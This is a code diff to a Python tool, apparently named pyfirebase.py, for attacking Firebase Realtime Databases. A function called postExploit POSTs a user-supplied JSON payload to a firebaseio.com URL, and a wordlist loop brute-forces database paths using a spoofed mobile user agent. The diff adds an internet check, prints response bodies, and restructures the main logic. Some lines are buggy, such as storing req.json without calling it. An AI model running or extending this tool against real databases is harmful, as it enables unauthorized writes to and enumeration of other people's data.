@@ -14,7 +14,7 @@ try:
 	import os.path
 except ImportError:
 	os.system("clear")
-	print("[ Error ] > Failed to import library")
+	echo("[ Error ] > Failed to import library", red, bold)
 
 
 
@@ -53,17 +53,36 @@ def echo(str, col, cha):
 
 
 
+def checkInternet(timeout):
+	try:
+		network = requests.head("https://google.com/", timeout=timeout)
+		return True
+	except requests.ConnectionError:
+		return False
+	
+
+
 def postExploit(url,data):
 	req    = requests.post(url,data=data)
 	result = req.status_code
+	text   = req.json
 	if result   == 200:
-		echo("Success!", green, bold)
+		os.system("clear")
+		echo(text, green, bold)
+		echo("OK!", green, bold)
 	elif result == 400:
-		echo("Something wrong!", red, bold)
+		os.system("clear")
+		echo(text, red, bold)
+		echo("Bad Request!", red, bold)
 	elif result == 404:
+		os.system("clear")
+		echo(text, red, bold)
 		echo("Not found!", red, bold)
 	elif result == 401:
+		os.system("clear")
+		echo(text, blue, bold)
 		echo("Permission Denied!", blue, bold)
+
 
 
 # Main function
@@ -85,56 +104,60 @@ def main():
 	txtFile = args.txt_file
 	payload = args.payload
 	
-	if not URL.startswith("https"):
-		echo("URL format must be in https!", red, bold)
-		time.sleep(3)
-		os.system("clear && python3 pyfirebase.py -h")
-	elif not URL.__contains__("firebaseio.com"):
-		echo("URL format must contain firebaseio.com", red, bold)
-		time.sleep(3)
-		os.system("clear && python3 pyfirebase.py -h")
+	if checkInternet(1) == True:
+		if not URL.startswith("https"):
+			echo("URL format must be in https!", red, bold)
+			time.sleep(3)
+			os.system("clear && python3 pyfirebase.py -h")
+		elif not URL.__contains__("firebaseio.com"):
+			echo("URL format must contain firebaseio.com", red, bold)
+			time.sleep(3)
+			os.system("clear && python3 pyfirebase.py -h")
 		
-	if payload.startswith("{") and payload.endswith("}"):
-		postExploit(URL, payload)
-	else:
-		os.system("clear")
-		echo("Wrong data format!\nExample: {'data':'test'}", red, bold)
+		if payload.startswith("{") and payload.endswith("}"):
+			postExploit(URL, payload)
+		else:
+			os.system("clear")
+			echo("Wrong data format!\nExample: {'data':'test'}", red, bold)
 		
-	if txtFile == None:
-		pass
-	else:
-		userAgent = {"User-Agent":"Mozilla/5.0 (Linux; Android 12; SM-S906N Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/80.0.3987.119 Mobile Safari/537.36"}
-		try:
-			if txtFile.__contains__("/"):
-				isDir = os.path.isdir(txtFile)
-				if isDir:
-					getLastPath = os.path.split(txtFile)
-					fileTxt     = getLastPath[1]
+		if txtFile == None:
+			pass
+		else:
+			userAgent = {"User-Agent":"Mozilla/5.0 (Linux; Android 12; SM-S906N Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/80.0.3987.119 Mobile Safari/537.36"}
+			try:
+				if txtFile.__contains__("/"):
+					isDir = os.path.isdir(txtFile)
+					if isDir:
+						getLastPath = os.path.split(txtFile)
+						fileTxt     = getLastPath[1]
+						os.system("clear")
+						ori         = requests.get(URL)
+						echo("Try: {} =>".format(URL) + str(ori.status_code) + "\n", green, bold)
+						with open(fileTxt, 'r') as file:
+							for data in file:
+								URL  = URL.replace(".json", "")
+								url  = URL + data + ".json"
+								http = requests.get(url.strip())
+								echo("Try: {} =>".format(url) + str(http.status_code) + "\n", green, bold)
+							file.close()
+					else:
+						echo("This is not a file!", red, bold)
+				else:
 					os.system("clear")
-					ori         = requests.get(URL)
+					ori = requests.get(URL)
 					echo("Try: {} =>".format(URL) + str(ori.status_code) + "\n", green, bold)
-					with open(fileTxt, 'r') as file:
+					with open(txtFile, 'r') as file:
 						for data in file:
 							URL  = URL.replace(".json", "")
 							url  = URL + data + ".json"
 							http = requests.get(url.strip())
 							echo("Try: {} =>".format(url) + str(http.status_code) + "\n", green, bold)
 						file.close()
-				else:
-					echo("This is not a file!", red, bold)
-			else:
-				os.system("clear")
-				ori = requests.get(URL)
-				echo("Try: {} =>".format(URL) + str(ori.status_code) + "\n", green, bold)
-				with open(txtFile, 'r') as file:
-					for data in file:
-						URL  = URL.replace(".json", "")
-						url  = URL + data + ".json"
-						http = requests.get(url.strip())
-						echo("Try: {} =>".format(url) + str(http.status_code) + "\n", green, bold)
-					file.close()
-		except KeyboardInterrupt: # Ctrl+C to stop this
-			echo("\nBruteforce Stoped...", blue, bold)
+			except KeyboardInterrupt: # Ctrl+C to stop this
+				echo("\nBruteforce Stoped...", blue, bold)
+	else:
+		os.system("clear")
+		echo("No Internet!", red, bold)
 
 
 
